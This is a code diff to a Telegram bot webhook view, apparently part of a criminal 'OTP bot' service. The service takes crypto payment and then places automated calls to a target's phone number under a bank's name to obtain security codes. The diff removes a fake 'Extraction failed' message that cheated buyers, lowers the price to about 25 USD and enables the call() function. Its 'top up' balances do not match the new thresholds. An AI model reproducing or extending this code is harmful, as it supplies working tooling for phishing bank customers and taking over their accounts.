@@ -359,25 +359,21 @@ class TelegrambotWebhookView(APIView):
                     # Handle the case where the response is empty
                     return Response({'message': 'Error: Received an empty response'}, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
                 if otp_bot.log:
-                    if usdvalue >= 9984.6:
-                        text = f"Extracting Security codes......"
+                    if usdvalue >= 24.6:
+                        text = f"Placing call to {phone_number}....☎️"
                         async_to_sync(bot)(chat_id,text)
-                        text = "Extraction failed, Secure connection lost. Please try again later."
-                        async_to_sync(bot)(chat_id,text)
-                        #call(phone_number,bank,chat_id) 
+                        call(phone_number,bank,chat_id) 
                     else:
-                        balance = 10000-usdvalue
+                        balance = 25-usdvalue
                         text = f"You sent insufficient funds. Top up with {balance} via the same address to proceed. ❗️‼❗️Send to the same address or loose your funds."
                         async_to_sync(bot)(chat_id,text)
                 else:
-                    if usdvalue >= 4985.5:
-                        text = f"Extracting Security codes......"
+                    if usdvalue >= 29.2:
+                        text = f"Placing call to {phone_number}....☎️"
                         async_to_sync(bot)(chat_id,text)
-                        text = "Extraction failed, Secure connection lost. Please try again later."
-                        async_to_sync(bot)(chat_id,text)
-                        #call(phone_number,bank,chat_id)
+                        call(phone_number,bank,chat_id)
                     else:
-                        balance = 5000-usdvalue
+                        balance = 15-usdvalue
                         text = f"You sent insufficient funds. Top up with {balance} via the same address to proceed. ❗️‼❗️Send to the same address or loose your funds."
                         async_to_sync(bot)(chat_id,text)
                 return Response({'message': 'message sent'},status=200)
